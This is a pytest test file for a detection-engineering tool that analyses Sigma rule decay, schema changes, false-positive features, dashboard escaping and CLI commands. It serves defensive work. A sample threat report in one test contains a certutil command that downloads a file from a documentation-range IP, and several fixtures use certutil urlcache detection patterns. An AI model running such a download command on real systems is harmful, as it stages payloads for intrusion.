"""Routed decay analysis, schema-change simulators, FP-model features, dashboard and new CLI commands."""
import json

import pytest

from anvil.cli import main
from anvil.dashboard import render
from anvil.decay import FieldInventory, analyse, apply_change
from anvil.fpmodel import features
from anvil.models import Rule
from anvil.telemetry import write_jsonl

SYSMON = "Microsoft-Windows-Sysmon/Operational"


def rule(det, category="process_creation", **kw):
    d = {"id": "00000000-0000-4000-8000-000000000001", "title": "t", "description": "d", "status": "test",
         "level": "high", "logsource": {"product": "windows", "category": category}, "detection": det}
    path = kw.pop("path", "")
    d.update(kw)
    return Rule.from_dict(d, path)


PROC = {"Channel": SYSMON, "EventID": 1, "Image": r"C:\w\certutil.exe", "CommandLine": "certutil -urlcache x",
        "OriginalFileName": "CertUtil.exe", "ParentImage": r"C:\w\cmd.exe", "Hashes": "SHA256=AB"}


def test_analyse_verdicts():
    inv = FieldInventory.from_events([PROC])
    ok = rule({"s": {"Image|endswith": "\\certutil.exe"}, "condition": "s"})
    assert analyse(ok, inv)["status"] == "ok"
    or_path = rule({"a": [{"Image|endswith": "\\x.exe"}, {"Missing": "y"}], "condition": "a"})
    assert analyse(or_path, inv)["status"] == "degraded"          # one OR branch survives
    broken = rule({"s": {"Missing": "y", "Image": "x"}, "condition": "s"})
    assert analyse(broken, inv)["status"] == "broken"
    blind = rule({"s": {"Image": "x"}, "filter": {"GoneField": "y"}, "condition": "s and not filter"})
    v = analyse(blind, inv)
    assert v["status"] == "degraded" and v["blind_filters"] == ["filter"]
    ps = rule({"s": {"ScriptBlockText|contains": "x"}, "condition": "s"}, category="ps_script")
    assert analyse(ps, inv)["status"] == "source-missing"


def test_schema_changes():
    (ecs,) = apply_change([PROC], "ecs_rename")
    assert "process.executable" in ecs and "Image" not in ecs
    (sec,) = apply_change([PROC], "sysmon_to_4688")
    assert sec["EventID"] == 4688 and sec["Channel"] == "Security" and "OriginalFileName" not in sec
    (nocmd,) = apply_change([PROC], "4688_no_cmdline")
    assert "CommandLine" not in nocmd
    assert apply_change([{**PROC, "EventID": 10}], "sysmon_to_4688") == []
    # a rule that needs OriginalFileName breaks when Sysmon is replaced by 4688
    r = rule({"s": {"OriginalFileName": "certutil.exe"}, "condition": "s"})
    assert analyse(r, FieldInventory.from_events(apply_change([PROC], "sysmon_to_4688")))["status"] == "broken"


def test_fpmodel_features():
    f = features(rule({"sel": {"Image|endswith": ["\\a.exe", "\\b.exe"], "CommandLine|contains": " -x"},
                       "filter_main": {"ParentImage": "c"}, "condition": "sel and not filter_main"},
                      path="rules-threat-hunting/windows/x.yml", level="low"))
    assert f["hunting"] == 1 and f["level"] == 1 and f["n_filters"] == 1 and f["has_not"] == 1
    assert f["mod_endswith"] == 2 and f["mod_contains"] == 1 and f["short_values"] >= 1


def test_fpmodel_cross_validation_runs():
    pytest.importorskip("sklearn")
    from anvil.fpmodel import cross_validate
    rules, labels = [], []
    for i in range(40):
        noisy = i % 4 == 0
        rules.append(rule({"s": {"Image|endswith": "\\a.exe" if noisy else "\\very_specific_tool.exe"},
                           "condition": "s"}, level="low" if noisy else "high"))
        labels.append(int(noisy))
    res = cross_validate(rules, labels, folds=4, importance=False)
    assert res["positives"] == 10 and res["models"]["logreg"]["roc_auc"] > 0.9


def test_dashboard_renders(tmp_path):
    (tmp_path / "lint.json").write_text(json.dumps({"rules": 3}))
    (tmp_path / "fp.json").write_text(json.dumps({
        "corpus": {"events": 10}, "fired_rules": 1, "gate_fail": 0, "policy": {"budget_per_rule_per_day": 20},
        "rules": [{"title": "<script>x</script>", "level": "low", "status": "test", "folder": "core",
                   "hits": 2, "alerts_per_day": 1.0, "gate": "pass"}]}))
    out = render(tmp_path, tmp_path / "d.html")
    txt = out.read_text(encoding="utf-8")
    assert "Detection health" in txt and "<script>x" not in txt and "&lt;script&gt;" in txt


def test_cli_scan_ingest_draft(tmp_path, capsys):
    rules = tmp_path / "rules"
    rules.mkdir()
    (rules / "r.yml").write_text(
        "title: Certutil URL cache\nid: 00000000-0000-4000-8000-000000000009\nstatus: test\nlevel: high\n"
        "logsource: {product: windows, category: process_creation}\n"
        "detection:\n  s:\n    CommandLine|contains: urlcache\n  condition: s\n")
    corpus = tmp_path / "c.jsonl.gz"
    write_jsonl([PROC, {**PROC, "CommandLine": "certutil -verify"}], corpus)
    assert main(["scan", "--rules", str(rules), "--corpus", str(corpus), "--json"]) == 0
    out = json.loads(capsys.readouterr().out)
    assert out["events"] == 2 and out["hits"][0]["hits"] == 1
    assert main(["ingest", str(corpus), "--out", str(tmp_path / "shards"), "--shard", "1"]) == 0
    assert len(list((tmp_path / "shards").glob("*.jsonl.gz"))) == 2
    report = tmp_path / "report.md"
    report.write_text("The actor ran:\n\n    C:\\> certutil.exe -urlcache -f http://203.0.113.9/a a.exe\n")
    assert main(["draft", str(report), "--out", str(tmp_path / "drafts")]) == 0
    drafted = list((tmp_path / "drafts").glob("*.yml"))
    assert drafted
    # drafts must not pass lint until a human marks them reviewed
    assert main(["lint", "--rules", str(tmp_path / "drafts"), "--profile", "sigma"]) == 1
